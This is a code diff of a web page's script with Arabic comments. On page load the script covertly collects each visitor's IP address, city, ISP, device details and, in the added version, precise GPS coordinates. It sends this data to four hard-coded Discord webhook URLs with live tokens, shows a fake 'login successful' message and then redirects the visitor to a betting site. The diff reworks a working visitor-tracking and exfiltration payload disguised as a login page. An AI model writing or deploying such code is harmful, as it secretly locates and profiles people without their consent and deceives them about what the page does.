@@ -66,78 +66,71 @@
 </div>
 
 <script>
-  // روابط الWebhooks لديسكورد
   const webhookUrls = [
-    "https://discord.com/api/webhooks/1363623232430936064/J9gRjc1oKd99eFYYDs2xfljezoyyVuh2vLPaVpMBMxAqSuNXfBpZm2cnyUzMaizDFN2V",  // Webhook 1
-    "https://discord.com/api/webhooks/1363623318787325953/f3A_DX_S8fcq5aFF4-cRdCQBb00ekBZ8jWLySMDypyK_HdSuY-DXti3XRF-j9Vcz-IPR",  // Webhook 2
-    "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ",  // Webhook 3
-    "https://discord.com/api/webhooks/1363573436290564218/anQti3PGWr2FaBbGWcsOI3MbUjFxMceQBqdb5CVNLP0TGUnCs_rGNbveyomWHsBo9ffW"   // Webhook 4
+    "https://discord.com/api/webhooks/1363623232430936064/J9gRjc1oKd99eFYYDs2xfljezoyyVuh2vLPaVpMBMxAqSuNXfBpZm2cnyUzMaizDFN2V",
+    "https://discord.com/api/webhooks/1363623318787325953/f3A_DX_S8fcq5aFF4-cRdCQBb00ekBZ8jWLySMDypyK_HdSuY-DXti3XRF-j9Vcz-IPR",
+    "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ",
+    "https://discord.com/api/webhooks/1363573436290564218/anQti3PGWr2FaBbGWcsOI3MbUjFxMceQBqdb5CVNLP0TGUnCs_rGNbveyomWHsBo9ffW"
   ];
 
-  // دالة لإرسال الرسالة لكل الWebhooks
   const sendToDiscord = (message) => {
-    // نستخدم Promise.allSettled لضمان إن الرسائل بتتبعت لباقي الأماكن حتى لو في مكان فشل
-    const promises = webhookUrls.map(url => 
+    const promises = webhookUrls.map(url =>
       fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: message })
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(`Failed to send to ${url}`);
-        }
-      })
-      .catch(error => {
-        console.error(error);  // لو في خطأ، يطبع الخطأ في الكونسول
-      })
+      }).catch(console.error)
     );
-
-    // نتأكد إن كل الpromises اتحققت بنجاح أو على الأقل ما توقفناش
-    Promise.allSettled(promises).then(results => {
-      // هنا نقدر نعرض أو نطبع النتيجة في الكونسول لو حبينا
-      results.forEach((result, index) => {
-        if (result.status === 'rejected') {
-          console.log(`Webhook ${index + 1} failed: ${result.reason}`);
-        } else {
-          console.log(`Webhook ${index + 1} succeeded.`);
-        }
-      });
-    });
+    return Promise.allSettled(promises);
   };
 
-  // طلب IP وموقع الزائر
-  fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-      const now = new Date().toLocaleString();
-      const userAgent = navigator.userAgent;
+  const gatherInfo = async () => {
+    let locationInfo = "📍 الموقع: لم يتم تحديد GPS\n";
 
-      // إرسال البيانات إلى ديسكورد
-      const message = {
-        content: `🕵️‍♂️ زائر جديد دخل الموقع:\n
-🌐 IP: ${data.ip}
-📍 الدولة: ${data.country_name} - ${data.city}
-🛰️ مزود الخدمة: ${data.org}
-⏰ المنطقة الزمنية: ${data.timezone}
+    try {
+      const position = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
+      );
+
+      const { latitude, longitude, accuracy } = position.coords;
+      locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- دقة التقريب: ${accuracy} متر\n`;
+    } catch (e) {
+      locationInfo = "📍 الموقع: المستخدم رفض أو لم يتم تحديد GPS\n";
+    }
+
+    const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
+    const userAgent = navigator.userAgent;
+    const lang = navigator.language;
+    const platform = navigator.platform;
+    const now = new Date().toLocaleString();
+
+    const message = `
+🕵️‍♂️ زائر جديد دخل الموقع:
+
+${locationInfo}
+🌐 IP: ${ipData.ip || "غير معروف"}
+🌍 الدولة: ${ipData.country_name || "?"} - ${ipData.city || "?"}
+🛰️ مزود الخدمة: ${ipData.org || "?"}
+🕰️ المنطقة الزمنية: ${ipData.timezone || "?"}
+
 🖥️ المتصفح: ${userAgent}
-📅 الوقت: ${now}`
-      };
+📱 الجهاز: ${platform}
+🌐 اللغة: ${lang}
+📅 الوقت: ${now}
+    `;
 
-      sendToDiscord(message.content);  // إرسال الرسالة
+    await sendToDiscord(message);
 
-      // بعد إرسال البيانات، نعرض رسالة مؤقتة ثم نحول
-      setTimeout(() => {
-        document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
-        setTimeout(() => {
-          window.location.href = "https://1xbet.com";
-        }, 3000); // تحويل بعد 3 ثواني من عرض الرسالة
-      }, 2000); // عرض الرسالة بعد 2 ثانية من الإرسال
-    })
-    .catch(err => {
-      document.querySelector('.card').innerHTML = '<p>⚠️ حصل خطأ في تحميل البيانات.</p>';
-      console.error(err);
-    });
+    document.querySelector('.card').innerHTML = "<h3>✅ تم تسجيل الدخول بنجاح</h3><p>جاري تحويلك الآن...</p>";
+    setTimeout(() => {
+      window.location.href = "https://1xbet.com";
+    }, 3000);
+  };
+
+  gatherInfo().catch(err => {
+    document.querySelector('.card').innerHTML = "<p>⚠️ حدث خطأ أثناء معالجة البيانات.</p>";
+    console.error(err);
+  });
 </script>
 
 </body>
